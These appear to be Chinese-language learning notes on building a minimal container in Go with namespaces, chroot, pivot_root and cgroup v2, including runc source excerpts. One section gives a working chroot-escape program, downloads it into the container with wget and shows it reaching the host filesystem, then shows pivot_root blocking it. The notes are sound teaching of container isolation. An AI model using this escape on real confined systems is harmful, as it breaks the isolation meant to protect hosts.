# Docker Dev

## Simple Docker

### CLONE_NEWNS, CLONE_NEWUTS, CLONE_NEWPID

```go
package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	switch os.Args[1] {
	case "run":
		parent()
	case "child":
		child()
	default:
		panic("Panic!!")
	}
}

func parent() {
	cmd := exec.Command("/proc/self/exe", append([]string{"child"}, os.Args[2:]...)...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// CLONE_NEWNS : name space, for file mounting
	// CLONE_NEWUTS: Unix Timesharing System, for hostname
	// CLONE_NEWPID: for process
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Cloneflags: syscall.CLONE_NEWNS | syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID,
	}

	if err := cmd.Run(); err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}
}

func child() {
	syscall.Sethostname([]byte("mini-docker"))

	cmd := exec.Command(os.Args[2], os.Args[3:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Println("ERROR", err)
		os.Exit(1)
	}
}

func must(err error) {
	if err != nil {
		panic(err)
	}
}
```

實驗看看：
```shell
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ sudo go run main.go run /bin/bash
root@mini-docker:/home/jjlin/learn-by-doing/go/projects/simple_docker# uname -a
Linux mini-docker 6.17.8-orbstack-00308-g8f9c941121b1 #1 SMP PREEMPT Thu Nov 20 09:34:02 UTC 2025 x86_64 GNU/Linux
root@mini-docker:/home/jjlin/learn-by-doing/go/projects/simple_docker# hostname
mini-docker
root@mini-docker:/home/jjlin/learn-by-doing/go/projects/simple_docker# ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 12:39 ?        00:00:01 [rosetta] /sbin/init /sbin/init
root           8       1  0 12:39 ?        00:00:00 orbstack-agent: ubuntu
root         122       1  0 12:39 ?        00:00:00 [rosetta] /usr/lib/systemd/systemd-journald /usr/lib/systemd/systemd-journald
root         173       1  0 12:39 ?        00:00:00 [rosetta] /usr/lib/systemd/systemd-udevd /usr/lib/systemd/systemd-udevd
systemd+     181       1  0 12:39 ?        00:00:00 [rosetta] /usr/lib/systemd/systemd-networkd /usr/lib/systemd/systemd-networkd
root         254       1  0 12:39 ?        00:00:00 [rosetta] /usr/sbin/cron /usr/sbin/cron -f -P
message+     255       1  0 12:39 ?        00:00:00 [rosetta] /usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopi
root         259       1  0 12:39 ?        00:00:00 [rosetta] /usr/lib/systemd/systemd-logind /usr/lib/systemd/systemd-logind
syslog       464       1  0 12:39 ?        00:00:00 [rosetta] /usr/sbin/rsyslogd /usr/sbin/rsyslogd -n -iNONE
root         470       1  0 12:39 pts/0    00:00:00 [rosetta] /sbin/agetty /sbin/agetty -o -- \u --noreset --noclear --keep-baud 115200,576
jjlin       1999       8  0 12:40 ?        00:00:00 [rosetta] /bin/bash -bash
jjlin       2005       1  0 12:40 ?        00:00:00 [rosetta] /usr/lib/systemd/systemd /usr/lib/systemd/systemd --user
jjlin       2006    1999  0 12:40 ?        00:00:00 [rosetta] /usr/bin/sh sh
jjlin       2016    2005  0 12:40 ?        00:00:00 (sd-pam)
jjlin       2066    2006  0 12:40 ?        00:00:15 [rosetta] /home/jjlin/.vscode-server/code-994fd12f8d3a5aa16f17d42c041e5809167e845a /hom
jjlin       2116    2066  0 12:40 ?        00:00:00 [rosetta] /usr/bin/sh sh /home/jjlin/.vscode-server/cli/servers/Stable-994fd12f8d3a5aa1
jjlin       2120    2116  0 12:40 ?        00:00:25 [rosetta] /home/jjlin/.vscode-server/cli/servers/Stable-994fd12f8d3a5aa16f17d42c041e580
jjlin       2146    2120  0 12:40 ?        00:00:35 [rosetta] /home/jjlin/.vscode-server/cli/servers/Stable-994fd12f8d3a5aa16f17d42c041e580
jjlin       5381    2120  1 12:54 ?        00:00:50 [rosetta] /home/jjlin/.vscode-server/cli/servers/Stable-994fd12f8d3a5aa16f17d42c041e580
jjlin       5382    2120  0 12:54 ?        00:00:02 [rosetta] /home/jjlin/.vscode-server/cli/servers/Stable-994fd12f8d3a5aa16f17d42c041e580
jjlin       5410    5381  0 12:54 ?        00:00:01 [rosetta] /home/jjlin/.vscode-server/cli/servers/Stable-994fd12f8d3a5aa16f17d42c041e580
jjlin       6288    2146  0 12:58 pts/1    00:00:00 [rosetta] /bin/bash /bin/bash --init-file /home/jjlin/.vscode-server/cli/servers/Stable
jjlin      14243    5381  0 12:59 ?        00:00:26 [rosetta] /home/jjlin/go/bin/gopls /home/jjlin/go/bin/gopls
jjlin      14253   14243  0 12:59 ?        00:00:00 [rosetta] /home/jjlin/go/bin/gopls /home/jjlin/go/bin/gopls ** telemetry **
jjlin      15878    2146  0 13:08 pts/2    00:00:00 [rosetta] /bin/bash /bin/bash --init-file /home/jjlin/.vscode-server/cli/servers/Stable
jjlin      16119    5381  0 13:11 ?        00:00:01 [rosetta] /home/jjlin/.vscode-server/cli/servers/Stable-994fd12f8d3a5aa16f17d42c041e580
jjlin      18438    2146  0 13:19 pts/3    00:00:00 [rosetta] /bin/bash /bin/bash --init-file /home/jjlin/.vscode-server/cli/servers/Stable
jjlin      19516    2006  0 13:46 ?        00:00:00 [rosetta] /usr/bin/sleep sleep 180
root       19762    6288  0 13:48 pts/1    00:00:00 [rosetta] /usr/bin/sudo sudo go run main.go run /bin/bash
root       19764   19762  0 13:48 pts/4    00:00:00 [rosetta] /usr/bin/sudo sudo go run main.go run /bin/bash
root       19765   19764  1 13:48 pts/4    00:00:00 [rosetta] /usr/bin/go go run main.go run /bin/bash
root       19878   19765  0 13:48 pts/4    00:00:00 [rosetta] /root/.cache/go-build/7a/7a3df3fb1b47b56d2012b982c4c4684f02208931b3619fcd904d
root       19883   19878  0 13:48 pts/4    00:00:00 [rosetta] /root/.cache/go-build/7a/7a3df3fb1b47b56d2012b982c4c4684f02208931b3619fcd904d
root       19888   19883  0 13:48 pts/4    00:00:00 [rosetta] /bin/bash /bin/bash
root       20016   19888 83 13:48 pts/4    00:00:00 [rosetta] /usr/bin/ps ps -ef
root@mini-docker:/home/jjlin/learn-by-doing/go/projects/simple_docker# cat /proc/1/comm
systemd
```

hostname 雖然被隔離了，但是為何還是看到這麼多 process？ pid 1 竟然是 systemd ？

## chroot & rootfs

雖然我們隔離了 namespace(`CLONE_NEWNS `)，但就像 fork 後 child process 會繼承 parent process 的 fd 一樣，這裡的 child 也繼承了 parent `/proc` 當中的內容。

要做到真正的隔離，讓 child 的 `/proc` 有全新的內容，我們需要 `chroot` 以及 `rootfs`。

首先，下載 rootfs：

```shell
mkdir -p rootfs
curl -Lo alpine-rootfs.tar.gz https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/x86_64/alpine-minirootfs-3.19.1-x86_64.tar.gz
tar -xvf alpine-rootfs.tar.gz -C ./rootfs
```

總大小才 8.6MB：
```shell
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ du -sh ./rootfs/
8.6M    ./rootfs/
```

可觀察到它就是一個 User Space 檔案與目錄的集合：
```shell
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ ll ./rootfs/
total 0
drwxr-xr-x 1 jjlin jjlin 114 Jan 27  2024 ./
drwxr-xr-x 1 jjlin jjlin  44 Dec 27 14:43 ../
drwxr-xr-x 1 jjlin jjlin 858 Jan 27  2024 bin/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 dev/
drwxr-xr-x 1 jjlin jjlin 586 Jan 27  2024 etc/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 home/
drwxr-xr-x 1 jjlin jjlin 280 Jan 27  2024 lib/
drwxr-xr-x 1 jjlin jjlin  28 Jan 27  2024 media/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 mnt/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 opt/
dr-xr-xr-x 1 jjlin jjlin   0 Jan 27  2024 proc/
drwx------ 1 jjlin jjlin   0 Jan 27  2024 root/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 run/
drwxr-xr-x 1 jjlin jjlin 790 Jan 27  2024 sbin/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 srv/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 sys/
drwxr-xr-x 1 jjlin jjlin   0 Jan 27  2024 tmp/
drwxr-xr-x 1 jjlin jjlin  40 Jan 27  2024 usr/
drwxr-xr-x 1 jjlin jjlin  86 Jan 27  2024 var/
```

可觀察到裡面使用了 busybox(所以才會 size 才會只有幾 MB)：
```shell
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ tree -L 2 ./rootfs/
./rootfs/
├── bin
│   ├── arch -> /bin/busybox
│   ├── ash -> /bin/busybox
│   ├── base64 -> /bin/busybox
│   ├── bbconfig -> /bin/busybox
│   ├── busybox
│   ├── cat -> /bin/busybox
│   ├── chattr -> /bin/busybox
│   ├── chgrp -> /bin/busybox
│   ├── chmod -> /bin/busybox
```

rootfs 準備好之後，我們來改 child 的邏輯：chroot 到 `rootfs`，然後 cd 到 `/`，接著 mount child 的 `proc` 到 `/`（rootfs） 的 `/proc`

```go
func child() {
	syscall.Sethostname([]byte("mini-docker"))

	must(syscall.Chroot("./rootfs"))
	must(os.Chdir("/"))

	must(syscall.Mount("proc", "/proc", "proc", syscall.MS_RDONLY | syscall.MS_NOSUID | syscall.MS_NOEXEC, "")) // source, target, fstype, flags, args

	cmd := exec.Command(os.Args[2], os.Args[3:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Println("ERROR", err)
		os.Exit(1)
	}
}
```

測試看看，注意，啟動的 shell 改成了 `/bin/sh`，因為 `rootfs` 裡面沒有 `/bin/bash`。

```shell
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ sudo go run main.go run /bin/sh
/ # whoami
root
/ # hostname
mini-docker
/ # ps -ef
PID   USER     TIME  COMMAND
    1 root      0:00 {main} /proc/self/exe child /bin/sh
    6 root      0:00 /bin/sh
    9 root      0:00 ps -ef
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
```


## Jailbreak

chroot 雖然改變了目前的 root directory，但是舊的 root directory 還存在，所以可以透過工具來回到舊的 root，也就是 jailbreak。

首先，我們來準備工具，這個簡單的 jail break go script 做的事情就是：

1. 在目前的 root(`/`) 裡再建立一個子 directory(`breakout`)，並 chroot 進去，同時，手裡抓著目前這一層(`/`)的 fd
2. 利用 fd 跳回上一層（`/`），但此時 process 自身的 root directory(`breakout`) 變成在目前的 directory(`/`) 之下，所以進行 `cd ..` 並不會被擋住

我們將這個工具編譯成可執行檔，讓 mini-docker 可以利用 `wget` 拿到後執行。

```go
package main

import (
	"os"
	"syscall"
)

func main() {
	os.Mkdir("breakout", 0755)
	fd, _ := syscall.Open(".", syscall.O_RDONLY, 0)

	syscall.Chroot("breakout")
	syscall.Fchdir(fd)

	for i := 0; i < 100; i++ {
		syscall.Chdir("..")
	}

	syscall.Chroot(".")
	syscall.Exec("/bin/sh", []string{"/bin/sh"}, os.Environ())
}
```

實驗看看：

開啟 server：
```
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.139.31 - - [28/Dec/2025 09:48:42] "GET /jail-break HTTP/1.1" 200 -
```

執行 `mini-docker` 嘗試 jail break：
```
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ sudo ./mini-docker run /bin/sh
/ # pwd
/
/ # wget http://192.168.139.31:8080/jail-break
Connecting to 192.168.139.31:8080 (192.168.139.31:8080)
saving to 'jail-break'
jail-break           100% |*************************************************************************************************| 1847k  0:00:00 ETA
'jail-break' saved
/ # ls
bin         etc         jail-break  media       opt         root        sbin        sys         usr
dev         home        lib         mnt         proc        run         srv         tmp         var
/ # ll
/bin/sh: ll: not found
/ # ls -la
total 1848
drwxr-xr-x    1 501      501            134 Dec 28 01:48 .
drwxr-xr-x    1 501      501            134 Dec 28 01:48 ..
drwxr-xr-x    1 501      501            858 Jan 26  2024 bin
drwxr-xr-x    1 501      501              0 Jan 26  2024 dev
drwxr-xr-x    1 501      501            586 Jan 26  2024 etc
drwxr-xr-x    1 501      501              0 Jan 26  2024 home
-rw-r--r--    1 root     root       1891664 Dec 28 01:48 jail-break
drwxr-xr-x    1 501      501            280 Jan 26  2024 lib
drwxr-xr-x    1 501      501             28 Jan 26  2024 media
drwxr-xr-x    1 501      501              0 Jan 26  2024 mnt
drwxr-xr-x    1 501      501              0 Jan 26  2024 opt
dr-xr-xr-x  277 root     root             0 Dec 28 01:48 proc
drwx------    1 501      501             24 Dec 27 07:03 root
drwxr-xr-x    1 501      501              0 Jan 26  2024 run
drwxr-xr-x    1 501      501            790 Jan 26  2024 sbin
drwxr-xr-x    1 501      501              0 Jan 26  2024 srv
drwxr-xr-x    1 501      501              0 Jan 26  2024 sys
drwxr-xr-x    1 501      501              0 Dec 27 07:03 tmp
drwxr-xr-x    1 501      501             40 Jan 26  2024 usr
drwxr-xr-x    1 501      501             86 Jan 26  2024 var
/ # chmod +x jail-break 
/ # ls -la
total 1848
drwxr-xr-x    1 501      501            134 Dec 28 01:48 .
drwxr-xr-x    1 501      501            134 Dec 28 01:48 ..
drwxr-xr-x    1 501      501            858 Jan 26  2024 bin
drwxr-xr-x    1 501      501              0 Jan 26  2024 dev
drwxr-xr-x    1 501      501            586 Jan 26  2024 etc
drwxr-xr-x    1 501      501              0 Jan 26  2024 home
-rwxr-xr-x    1 root     root       1891664 Dec 28 01:48 jail-break
drwxr-xr-x    1 501      501            280 Jan 26  2024 lib
drwxr-xr-x    1 501      501             28 Jan 26  2024 media
drwxr-xr-x    1 501      501              0 Jan 26  2024 mnt
drwxr-xr-x    1 501      501              0 Jan 26  2024 opt
dr-xr-xr-x  277 root     root             0 Dec 28 01:48 proc
drwx------    1 501      501             24 Dec 27 07:03 root
drwxr-xr-x    1 501      501              0 Jan 26  2024 run
drwxr-xr-x    1 501      501            790 Jan 26  2024 sbin
drwxr-xr-x    1 501      501              0 Jan 26  2024 srv
drwxr-xr-x    1 501      501              0 Jan 26  2024 sys
drwxr-xr-x    1 501      501              0 Dec 27 07:03 tmp
drwxr-xr-x    1 501      501             40 Jan 26  2024 usr
drwxr-xr-x    1 501      501             86 Jan 26  2024 var
/ # ./jail-break 
# pwd
/
# ls
Applications  Users    bin   dev  home  lib64  mnt  private  root  sbin  sys  usr
Library       Volumes  boot  etc  lib   media  opt  proc     run   srv   tmp  var
```

可以看到我們成功來到了 `mini-docker` 之外，看到了 host 的 directory(orbstack ubuntu)。

## pivot_root

`chroot` 後還是可以爬回原本的舊 root，就是因為舊的 root 還存在，如果要徹底根除這個隱患，最好的方式就是讓舊 root 從 process 的 mount table 消失。

要達成這個目的，我們有簡單的工具：`PivotRoot`。

`PivotRoot` 會做什麼事情？詳見 [man pivot_root](https://man7.org/linux/man-pages/man2/pivot_root.2.html)。
> pivot_root() changes the root mount in the mount namespace of the calling process.  More precisely, **it moves the root mount to the directory put_old and makes new_root the new root mount**.  The calling process must have the CAP_SYS_ADMIN capability in the user namespace that owns the caller's mount namespace.

舉例：

狀態：
* current root: `/`
* old root: `/some_old_root_dir`

參數：
* `old_root`: `/rootfs/.old_root`
* `new_root`: `/rootfs`

執行 `syscall.PivotRoot(new_root, old_root)` 後：

狀態：
* current root: `/rootfs`
* old root: `/`

此時，old root 被掛在哪裡？掛在參數 `old_root` 指定的地方，也就是 `/rootfs/.old_root`。所以我們 unmount `old_root` 時，就會把 old root(`/`) 給 unmount 掉，jail break 就會失敗，因為沒有地方可以回去了。

```go
func child() {
	must(syscall.Sethostname([]byte("mini-docker")))
	must(syscall.Mount("", "/", "", syscall.MS_REC|syscall.MS_SLAVE, "")) // MS_SLAVE => Unidirectional, MS_PRIVATE => Isolate
	
	// change start
	rootfs := "./rootfs"
	must(syscall.Mount(rootfs, rootfs, "", syscall.MS_BIND|syscall.MS_REC, ""))

	oldRoot := filepath.Join(rootfs, ".old_root")
	must(os.MkdirAll(oldRoot, 0700))

	must(syscall.PivotRoot(rootfs, oldRoot))

	must(os.Chdir("/"))

	must(syscall.Unmount("/.old_root", syscall.MNT_DETACH))
	must(os.Remove("/.old_root"))
	// change end
	
	must(syscall.Mount("proc", "/proc", "proc", syscall.MS_RDONLY|syscall.MS_NOSUID|syscall.MS_NOEXEC, "")) // source, target, fstype, flags, args

	cmd := exec.Command(os.Args[2], os.Args[3:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Println("ERROR", err)
		os.Exit(1)
	}
}
```

實驗看看：

```
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ sudo ./mini-docker run /bin/sh
/ # ls
bin         dev         home        lib         mnt         proc        run         srv         tmp         var
breakout    etc         jail-break  media       opt         root        sbin        sys         usr
/ # ./jail-break 
/ # ls
bin         dev         home        lib         mnt         proc        run         srv         tmp         var
breakout    etc         jail-break  media       opt         root        sbin        sys         usr
/ # 
```
> 可以觀察到，這次我們看不到 host 的 directory 了，代表 jail break 失敗


## runc - pivotRoot

- [runc - rootfs_linux.go - pivotRoot](https://github.com/opencontainers/runc/blob/main/libcontainer/rootfs_linux.go#L1123)
- [runc - rootfs_linux.go](https://github.com/opencontainers/runc/blob/main/libcontainer/rootfs_linux.go)
- [runc - container_linux.go](https://github.com/opencontainers/runc/blob/main/libcontainer/container_linux.go)

我們來看看 production 等級（`runc`）的 pivot root 是如何做的：

首先，關於 `unix.PivotRoot(".", ".")`，為何 `runc` 不需要建立一個放 old root 的 directory 就可以直接 pivot root? 答案就在註解中：`... this results in is / being the new root but /proc/self/cwd being the old root ...`。

在執行 `unix.PivotRoot(".", ".")` 的當下，首先第一個參數 `.`（`rootfs`） 被處理，所以 process 的 root 會切換成 `newroot`（`rootfs`），接著，處理第二個參數時，此時新的 root 位於 rootfs，舊的 root 則是 `/proc/self/cwd`，因此 `/proc/self/cwd` 會被掛到 `.` 底下。

到此為止，新和舊的 root 都被 mount 在 `.` 下，而目前的 current working directory 根據 kernel code，會是 `oldroot`，但 `runc` 為了保險起見還是顯示的 `unix.Fchdir(oldroot)` 一次。

接著，設定 `unix.MS_SLAVE` 避免 unmount 到 host。最後 `unmount(".", unix.MNT_DETACH)`。為何這裡可以直接 unmount `.`？因為掛載操作遵守 `LIFO`(Last-In, First-Out)，在執行 `unix.PivotRoot(".", ".")` 時舊的 root 比較晚才被掛起來。

```go

// pivotRoot will call pivot_root such that rootfs becomes the new root
// filesystem, and everything else is cleaned up.
func pivotRoot(rootfs string) error {
	// While the documentation may claim otherwise, pivot_root(".", ".") is
	// actually valid. What this results in is / being the new root but
	// /proc/self/cwd being the old root. Since we can play around with the cwd
	// with pivot_root this allows us to pivot without creating directories in
	// the rootfs. Shout-outs to the LXC developers for giving us this idea.

	oldroot, err := linux.Open("/", unix.O_DIRECTORY|unix.O_RDONLY, 0)
	if err != nil {
		return err
	}
	defer unix.Close(oldroot)

	newroot, err := linux.Open(rootfs, unix.O_DIRECTORY|unix.O_RDONLY, 0)
	if err != nil {
		return err
	}
	defer unix.Close(newroot)

	// Change to the new root so that the pivot_root actually acts on it.
	if err := unix.Fchdir(newroot); err != nil {
		return &os.PathError{Op: "fchdir", Path: "fd " + strconv.Itoa(newroot), Err: err}
	}

	if err := unix.PivotRoot(".", "."); err != nil {
		return &os.PathError{Op: "pivot_root", Path: ".", Err: err}
	}

	// Currently our "." is oldroot (according to the current kernel code).
	// However, purely for safety, we will fchdir(oldroot) since there isn't
	// really any guarantee from the kernel what /proc/self/cwd will be after a
	// pivot_root(2).

	if err := unix.Fchdir(oldroot); err != nil {
		return &os.PathError{Op: "fchdir", Path: "fd " + strconv.Itoa(oldroot), Err: err}
	}

	// Make oldroot rslave to make sure our unmounts don't propagate to the
	// host (and thus bork the machine). We don't use rprivate because this is
	// known to cause issues due to races where we still have a reference to a
	// mount while a process in the host namespace are trying to operate on
	// something they think has no mounts (devicemapper in particular).
	if err := mount("", ".", "", unix.MS_SLAVE|unix.MS_REC, ""); err != nil {
		return err
	}
	// Perform the unmount. MNT_DETACH allows us to unmount /proc/self/cwd.
	if err := unmount(".", unix.MNT_DETACH); err != nil {
		return err
	}

	// Switch back to our shiny new root.
	if err := unix.Chdir("/"); err != nil {
		return &os.PathError{Op: "chdir", Path: "/", Err: err}
	}
	return nil
}
```

看完了 `runc` 如何處理 pivotRoot 後，我們來改一下原本的實作：

```go
func child() {
	must(syscall.Sethostname([]byte("mini-docker")))
	must(syscall.Mount("", "/", "", syscall.MS_REC|syscall.MS_SLAVE, "")) // MS_SLAVE => Unidirectional, MS_PRIVATE => Isolate

	rootfs := "./rootfs"
	must(syscall.Mount(rootfs, rootfs, "", syscall.MS_BIND|syscall.MS_REC, ""))

	// change start
	oldRootFd, err := syscall.Open("/", syscall.O_DIRECTORY|syscall.O_RDONLY, 0)
	if err != nil {
		panic(err)
	}
	defer syscall.Close(oldRootFd)

	must(os.Chdir(rootfs))
	must(syscall.PivotRoot(".", "."))
	must(syscall.Fchdir(oldRootFd))
	must(syscall.Mount("", ".", "", syscall.MS_SLAVE|syscall.MS_REC, ""))
	must(syscall.Unmount(".", syscall.MNT_DETACH))
	must(os.Chdir("/"))
	// change end

	must(syscall.Mount("proc", "/proc", "proc", syscall.MS_RDONLY|syscall.MS_NOSUID|syscall.MS_NOEXEC, "")) // source, target, fstype, flags, args

	cmd := exec.Command(os.Args[2], os.Args[3:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Println("ERROR", err)
		os.Exit(1)
	}
}
```

按照一樣方法測試後，確認 jail break 失敗！


## Control Group

- [Control Group v2](https://docs.kernel.org/admin-guide/cgroup-v2.html)

### CPU

目前我們的 mini-docker 是還沒有設定任何 control group 的，代表，它和 host 的資源是共享的。我們先來試試看把 CPU 打爆：

```shell
jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ sudo ./mini-docker run /bin/sh
/ # while true; do true; done
```

開另一個 shell 觀察，可以看到， mini-docker 執行的 `/bin/sh` 的 CPU% 衝到了 100%：
```shell
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                   
  12837 root      20   0  417100   1748    848 R 100.0   0.0   1:18.34 sh  
```

現在，我們來為這個 mini-docker 加上 CPU 的使用限制，我們設定每 100ms 的週期內，mini-docker 只能使用 10ms。週期通常建議的預設值就是 100ms，太小的話 kernel 會報錯。

`cgroup.procs` 裡放的是屬於此 cgroup 的 PID，且任何子行程都會屬於同個 cgroup，受到同樣的限制。同一個 cgroup 中的所有 process 共享這 10% CPU 的配額。

```go
func child() {
	// cgroup v2 setting start
	cgroupPath := "/sys/fs/cgroup/mini-docker"
	os.MkdirAll(cgroupPath, 0755)

	must(os.WriteFile(cgroupPath+"/cpu.max", []byte("10000 100000"), 0644)) // MAX(μs) PERIOD(μs)
	must(os.WriteFile(cgroupPath+"/cgroup.procs", []byte("0"), 0644)) // 0 -> current process
	// cgroup v2 setting end

	must(syscall.Sethostname([]byte("mini-docker")))
	must(syscall.Mount("", "/", "", syscall.MS_REC|syscall.MS_SLAVE, "")) // MS_SLAVE => Unidirectional, MS_PRIVATE => Isolate
	// ...
}
```

再測試一遍，可以看到 mini-docker 執行的 `/bin/sh` 的 CPU% 降到了 10%，符合預期：

```shell
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                   
  14531 root      20   0  417096   2468   1572 R  10.0   0.0   0:01.44 sh  
```

同時跑兩個 process（`while true; do true; done & while true; do true; done`），可以觀察到他們共同吃滿了這 10%：

```shell
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                   
  14531 root      20   0  417124   2044   1104 R   5.6   0.0   0:02.83 sh                        
  14901 root      20   0  417124   1872    932 R   4.3   0.0   0:00.52 sh   
```

### cgroup in task_struct

[task_struct](https://elixir.bootlin.com/linux/v6.18.2/source/include/linux/sched.h#L819) 的 source code 如下：

```c
struct task_struct {
	// ...
	// ...

	#ifdef CONFIG_CGROUPS
	/* Control Group info protected by css_set_lock: */
	struct css_set __rcu		*cgroups;
	/* cg_list protected by css_set_lock and tsk->alloc_lock: */
	struct list_head		cg_list;
	#endif
	// ...
} __attribute__ ((aligned (64)));
```
> `cgroups` 為指標，指向該 `task_struct` 所屬的 Cgroup 集合。
> `cg_list` 讓 `css_set` 可以把所有屬於它的 `task_struct` 串在一起。

### list_head

[list_head](https://elixir.bootlin.com/linux/v6.18.2/source/include/linux/types.h#L199) 的 source code 如下：

```c
struct list_head {
	struct list_head *next, *prev;
};
```

### css_set

[struct css_set](https://elixir.bootlin.com/linux/v6.18.2/source/include/linux/cgroup-defs.h#L272) 的 source code 如下：

因為同一個 control group 裡不同 `task_struct` 共享同一個 `css_set`，比如說一個使用 Docker Container 建立的 web server，會有成千上萬的 process 都屬於同一個 control group。若每一個 process 都自己維護自己的 control group 資訊，會很沒有效率(`fork()` 會變很慢)。若改成每個 process 只維護一個 `css_set` 指標，事情就變得簡單許多。

```c
/*
 * A css_set is a structure holding pointers to a set of
 * cgroup_subsys_state objects. This saves space in the task struct
 * object and speeds up fork()/exit(), since a single inc/dec and a
 * list_add()/del() can bump the reference count on the entire cgroup
 * set for a task.
 */
struct css_set {
	/*
	 * Set of subsystem states, one for each subsystem. This array is
	 * immutable after creation apart from the init_css_set during
	 * subsystem registration (at boot time).
	 */
	struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];

	/* reference count */
	refcount_t refcount;

	/*
	 * For a domain cgroup, the following points to self.  If threaded,
	 * to the matching cset of the nearest domain ancestor.  The
	 * dom_cset provides access to the domain cgroup and its csses to
	 * which domain level resource consumptions should be charged.
	 */
	struct css_set *dom_cset;

	/* the default cgroup associated with this css_set */
	struct cgroup *dfl_cgrp;

	/* internal task count, protected by css_set_lock */
	int nr_tasks;

	/*
	 * Lists running through all tasks using this cgroup group.
	 * mg_tasks lists tasks which belong to this cset but are in the
	 * process of being migrated out or in.  Protected by
	 * css_set_lock, but, during migration, once tasks are moved to
	 * mg_tasks, it can be read safely while holding cgroup_mutex.
	 */
	struct list_head tasks;
	struct list_head mg_tasks;
	struct list_head dying_tasks;

	/* all css_task_iters currently walking this cset */
	struct list_head task_iters;

	/*
	 * On the default hierarchy, ->subsys[ssid] may point to a css
	 * attached to an ancestor instead of the cgroup this css_set is
	 * associated with.  The following node is anchored at
	 * ->subsys[ssid]->cgroup->e_csets[ssid] and provides a way to
	 * iterate through all css's attached to a given cgroup.
	 */
	struct list_head e_cset_node[CGROUP_SUBSYS_COUNT];

	/* all threaded csets whose ->dom_cset points to this cset */
	struct list_head threaded_csets;
	struct list_head threaded_csets_node;

	/*
	 * List running through all cgroup groups in the same hash
	 * slot. Protected by css_set_lock
	 */
	struct hlist_node hlist;

	/*
	 * List of cgrp_cset_links pointing at cgroups referenced from this
	 * css_set.  Protected by css_set_lock.
	 */
	struct list_head cgrp_links;

	/*
	 * List of csets participating in the on-going migration either as
	 * source or destination.  Protected by cgroup_mutex.
	 */
	struct list_head mg_src_preload_node;
	struct list_head mg_dst_preload_node;
	struct list_head mg_node;

	/*
	 * If this cset is acting as the source of migration the following
	 * two fields are set.  mg_src_cgrp and mg_dst_cgrp are
	 * respectively the source and destination cgroups of the on-going
	 * migration.  mg_dst_cset is the destination cset the target tasks
	 * on this cset should be migrated to.  Protected by cgroup_mutex.
	 */
	struct cgroup *mg_src_cgrp;
	struct cgroup *mg_dst_cgrp;
	struct css_set *mg_dst_cset;

	/* dead and being drained, ignore for migration */
	bool dead;

	/* For RCU-protected deletion */
	struct rcu_head rcu_head;
};
```



```
Process A (task_struct)
      +-----------------------+
      | cgroups (指標)         | ---+
      +-----------------------+    |
                                   v
       Process B (task_struct)   [ css_set 結構體 ] (多個 Process 共享同一個集合)
      +-----------------------+    +------------------------------------------+
      | cgroups (指標)         | -->| subsys[0] (CPU)    --> 指向 CPU Cgroup X   |
      +-----------------------+    | subsys[1] (Memory) --> 指向 Mem Cgroup Y   |
                                   | subsys[2] (I/O)    --> 指向 I/O Cgroup Z   |
                                   +------------------------------------------+
```
> 同個 control group 底下的 process 共享同一個 css_set


```
[ Process A (task_struct) ]      [ Process B (task_struct) ]
+-----------------------+        +-----------------------+
| cgroups pointer    ---|---+    | cgroups pointer    ---|---+ (指向同一個 css_set)
| cg_list (node)     <--|-| |--->| cg_list (node)     <--|-|
+-----------------------+ | |    +-----------------------+ |
                          | |                              |
                          v v                              |
                 +-----------------------------+           |
                 |      css_set (Set 1)        | <---------+
                 |-----------------------------|
                 | tasks list_head             |----> 指向 A 和 B 的 cg_list
                 |-----------------------------|
                 | pointers to cgroups:        |
                 |  - CPU: /user               |
                 |  - Mem: /user               |
                 +-----------------------------+
```